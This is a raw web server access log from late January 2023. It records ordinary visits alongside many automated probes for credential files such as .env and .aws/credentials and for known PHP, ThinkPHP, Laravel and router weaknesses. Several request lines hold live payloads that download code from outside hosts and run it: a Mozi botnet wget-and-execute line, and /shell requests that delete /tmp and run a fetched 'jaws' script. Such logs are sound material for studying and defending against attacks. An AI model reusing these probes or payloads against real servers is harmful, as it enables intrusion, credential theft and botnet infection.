240b:4005:18:3b00:88cd:89dd:7daf:c3fd - - [29/Jan/2023:12:42:28 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
240b:4005:18:3b00:88cd:89dd:7daf:c3fd - - [29/Jan/2023:12:42:38 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [29/Jan/2023:13:09:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
46.170.91.230 - - [29/Jan/2023:13:30:09 -0600] "GET / HTTP/1.0" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.158.175.214 - - [29/Jan/2023:13:55:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
143.110.222.166 - - [29/Jan/2023:14:10:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.172.49.49 - - [29/Jan/2023:14:39:01 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [29/Jan/2023:15:09:39 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [29/Jan/2023:15:15:19 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
193.56.29.186 - - [29/Jan/2023:15:17:48 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [29/Jan/2023:15:17:49 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.186 - - [29/Jan/2023:15:17:50 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "-" "python-requests/2.25.1"
152.89.196.211 - - [29/Jan/2023:15:18:58 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [29/Jan/2023:15:29:39 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 309 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.243.131.19 - - [29/Jan/2023:15:38:01 -0600] "GET /hudson HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.211 - - [29/Jan/2023:15:50:38 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.224.128.219 - - [29/Jan/2023:15:52:28 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
152.89.196.211 - - [29/Jan/2023:16:09:32 -0600] "GET /console/ HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [29/Jan/2023:16:11:44 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
46.19.136.74 - - [29/Jan/2023:16:12:51 -0600] "GET /config.json HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
46.19.136.74 - - [29/Jan/2023:16:12:52 -0600] "GET /config.json HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
152.89.196.211 - - [29/Jan/2023:16:17:33 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [29/Jan/2023:16:31:31 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.103.92.238 - - [29/Jan/2023:17:02:03 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
51.103.92.238 - - [29/Jan/2023:17:02:03 -0600] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
179.43.177.242 - - [29/Jan/2023:17:04:48 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [29/Jan/2023:17:10:36 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.104.241.77 - - [29/Jan/2023:17:10:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
134.209.148.237 - - [29/Jan/2023:17:22:28 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.89.196.211 - - [29/Jan/2023:17:27:52 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.243.147.23 - - [29/Jan/2023:17:53:59 -0600] "GET /portal/redlion HTTP/1.1" 301 255 "-" "Mozilla/5.0 zgrab/0.x"
107.170.242.14 - - [29/Jan/2023:17:54:13 -0600] "GET /actuator/health HTTP/1.1" 301 256 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [29/Jan/2023:18:05:56 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
139.144.119.170 - - [29/Jan/2023:18:12:52 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
203.176.139.150 - - [29/Jan/2023:18:21:18 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
167.94.138.118 - - [29/Jan/2023:18:24:13 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.94.138.118 - - [29/Jan/2023:18:24:13 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.118 - - [29/Jan/2023:18:24:14 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
179.43.177.242 - - [29/Jan/2023:18:29:50 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
179.43.155.157 - - [29/Jan/2023:18:36:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.32.162.159 - - [29/Jan/2023:18:44:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
88.201.157.105 - - [29/Jan/2023:18:51:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [29/Jan/2023:19:11:04 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
15.235.12.96 - - [29/Jan/2023:19:16:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
15.235.12.96 - - [29/Jan/2023:19:16:41 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
128.199.94.99 - - [29/Jan/2023:19:59:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
143.110.222.166 - - [29/Jan/2023:20:08:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
177.251.56.11 - - [29/Jan/2023:20:09:51 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
117.254.31.240 - - [29/Jan/2023:20:15:41 -0600] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
143.110.222.166 - - [29/Jan/2023:21:10:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
184.105.139.68 - - [29/Jan/2023:21:19:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
184.105.139.68 - - [29/Jan/2023:21:20:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
185.224.128.219 - - [29/Jan/2023:21:20:40 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
184.105.139.68 - - [29/Jan/2023:21:20:49 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
152.32.144.44 - - [29/Jan/2023:21:40:26 -0600] "\x16\x03\x01\x01\t\x01" 400 226 "-" "-"
152.32.144.44 - - [29/Jan/2023:21:40:37 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
152.32.144.44 - - [29/Jan/2023:21:40:43 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Go-http-client/1.1"
152.32.144.44 - - [29/Jan/2023:21:40:46 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Go-http-client/1.1"
152.32.144.44 - - [29/Jan/2023:21:40:49 -0600] "GET /sitemap.xml HTTP/1.1" 301 252 "-" "Go-http-client/1.1"
140.246.136.252 - - [29/Jan/2023:21:46:31 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
139.144.119.170 - - [29/Jan/2023:22:07:00 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
143.110.222.166 - - [29/Jan/2023:22:07:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.143.201.87 - - [29/Jan/2023:22:07:48 -0600] "GET / HTTP/1.1" 301 241 "-" "curl/7.54.0"
143.110.222.166 - - [29/Jan/2023:23:05:21 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [29/Jan/2023:23:48:35 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
167.248.133.118 - - [29/Jan/2023:23:54:42 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.248.133.118 - - [29/Jan/2023:23:54:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.118 - - [29/Jan/2023:23:54:42 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
192.241.198.51 - - [29/Jan/2023:23:55:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 zgrab/0.x"
130.211.54.158 - - [30/Jan/2023:00:01:13 -0600] "GET / HTTP/1.1" 301 241 "-" "python-requests/2.28.2"
143.110.222.166 - - [30/Jan/2023:00:12:44 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.11.57.48 - - [30/Jan/2023:00:52:46 -0600] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 301 277 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
45.11.57.48 - - [30/Jan/2023:00:52:55 -0600] "POST /index.htm HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
179.43.177.242 - - [30/Jan/2023:00:57:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
20.85.234.30 - - [30/Jan/2023:01:11:52 -0600] "HEAD / HTTP/1.1" 301 - "-" "Python/3.7 aiohttp/3.7.4.post0"
20.85.234.30 - - [30/Jan/2023:01:11:52 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Python/3.7 aiohttp/3.7.4.post0"
20.85.234.30 - - [30/Jan/2023:01:11:53 -0600] "POST / HTTP/1.1" 301 241 "-" "Python/3.7 aiohttp/3.7.4.post0"
143.110.222.166 - - [30/Jan/2023:01:13:11 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
212.36.28.70 - - [30/Jan/2023:01:26:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
2001:470:1:332::56 - - [30/Jan/2023:01:41:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
2001:470:1:332::56 - - [30/Jan/2023:01:49:20 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
2001:470:1:332::40 - - [30/Jan/2023:01:49:25 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
143.110.222.166 - - [30/Jan/2023:02:07:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
91.132.0.234 - - [30/Jan/2023:02:26:14 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [30/Jan/2023:03:10:55 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
113.98.52.31 - - [30/Jan/2023:03:33:56 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
60.221.60.66 - - [30/Jan/2023:03:34:12 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
223.244.83.226 - - [30/Jan/2023:03:34:22 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
194.55.186.216 - - [30/Jan/2023:03:34:45 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [30/Jan/2023:04:07:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.143.186 - - [30/Jan/2023:04:09:26 -0600] "CONNECT google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
114.119.150.42 - - [30/Jan/2023:04:49:58 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
143.110.222.166 - - [30/Jan/2023:05:05:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [30/Jan/2023:05:55:01 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.132.0.234 - - [30/Jan/2023:05:55:11 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [30/Jan/2023:06:07:08 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.219 - - [30/Jan/2023:06:10:40 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
71.6.232.27 - - [30/Jan/2023:06:11:40 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
143.110.222.166 - - [30/Jan/2023:07:11:07 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.98.53 - - [30/Jan/2023:07:28:09 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:10 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:10 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:10 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:11 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:11 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:12 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:12 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:12 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:13 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:13 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:13 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:14 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:14 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:14 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:15 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:15 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:16 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:16 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [30/Jan/2023:07:28:16 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [30/Jan/2023:07:45:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
184.168.127.57 - - [30/Jan/2023:07:46:59 -0600] "GET / HTTP/1.0" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
143.110.222.166 - - [30/Jan/2023:08:10:08 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.79.181.104 - - [30/Jan/2023:08:32:03 -0600] "\x16\x03\x01" 400 226 "-" "-"
71.6.199.23 - - [30/Jan/2023:08:32:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.199.23 - - [30/Jan/2023:08:32:15 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "-"
71.6.199.23 - - [30/Jan/2023:08:32:15 -0600] "GET /sitemap.xml HTTP/1.1" 301 252 "-" "-"
71.6.199.23 - - [30/Jan/2023:08:32:15 -0600] "GET /.well-known/security.txt HTTP/1.1" 301 265 "-" "-"
71.6.199.23 - - [30/Jan/2023:08:32:16 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
193.32.162.159 - - [30/Jan/2023:08:43:04 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.198.70.92 - - [30/Jan/2023:08:47:15 -0600] "\x16\x03\x01" 400 226 "-" "-"
35.198.70.92 - - [30/Jan/2023:08:47:20 -0600] "OPTIONS / HTTP/1.0" 301 241 "-" "-"
